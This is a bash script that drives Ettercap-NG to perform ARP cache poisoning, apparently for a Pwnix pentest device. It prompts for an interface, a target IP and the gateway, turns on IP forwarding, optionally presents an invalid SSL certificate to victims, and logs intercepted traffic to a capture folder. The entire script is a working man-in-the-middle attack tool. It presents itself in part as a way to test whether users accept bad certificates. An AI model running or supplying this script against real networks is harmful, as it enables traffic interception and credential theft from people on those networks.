#!/bin/bash
#Ettercap arp cache poison script script

##################################################
f_interface(){
        clear

echo 
echo "		Ettercap-NG 0.8.0 ARP Cache Poison Script"
echo
echo "    NOTE: This only works on networks you are connected to"
echo "          DO NOT USE WITH EVILAP - IT WON'T WORK"
echo 
echo "Select which interface you would like to sniff / poison on? (1-6):"
echo 
echo "1. eth0  (USB ethernet adapter)"
echo "2. wlan0  (Internal Nexus Wifi)"
echo "3. wlan1  (USB TPlink Atheros)"
echo

        read -p "Choice: " interfacechoice

        case $interfacechoice in
        1) f_eth0 ;;
        2) f_wlan0 ;;
        3) f_wlan1 ;;
        *) f_interface ;;
        esac
}

#########################################
f_eth0(){
	interface=eth0
}

#########################################
f_wlan0(){
        interface=wlan0
}

#########################################
f_wlan1(){
        interface=wlan1
}

#########################################
f_sslfake(){

clear

echo 
echo "        Would you like to use the Invalid SSL Cert Option?"
echo
echo "Good for testing user policy to make sure users aren't accpeting bad certs!"
echo
echo "      NOTE: if using SSLstrip with ettercap this is not needed"
echo
echo "1. Yes"
echo "2. No "
echo
read -p "Choice: " sslfakecert
}

#########################################
f_logging(){

clear
echo 
echo "Would you like to log data?"
echo
echo "Captures saved to /opt/pwnix/captures/ettercap/"
echo
echo "1. Yes"
echo "2. No "
echo

read -p "Choice: " logchoice
}

#########################################
f_run(){

echo 1 > /proc/sys/net/ipv4/ip_forward

filename=/opt/pwnix/captures/ettercap/ettercap$(date +%F-%H%M)

clear
echo
read -p "Enter Target IP to arp cache poison: " target1
echo

clear 
echo
read -p "Enter Target IP of Gateway / Router: " gw
echo 



if [ $logchoice -eq 1 ] 
then


  if [ $sslfakecert -eq 1 ] 
  then

	  ettercap -i $interface -T -q -l $filename -M arp:remote /$gw/ /$target1/

  else

    ettercap -i $interface -T -S -q -l $filename -M arp:remote /$gw/ /$target1/

  fi

else

  if [ $sslfakecert -eq 1 ] 
  then

	  ettercap -i $interface -T -q -M arp:remote /$gw/ /$target1/

  else

    ettercap -i $interface -T -S -q -M arp:remote /$gw/ /$target1/

  fi

fi
}

f_interface
f_sslfake
f_logging
f_run
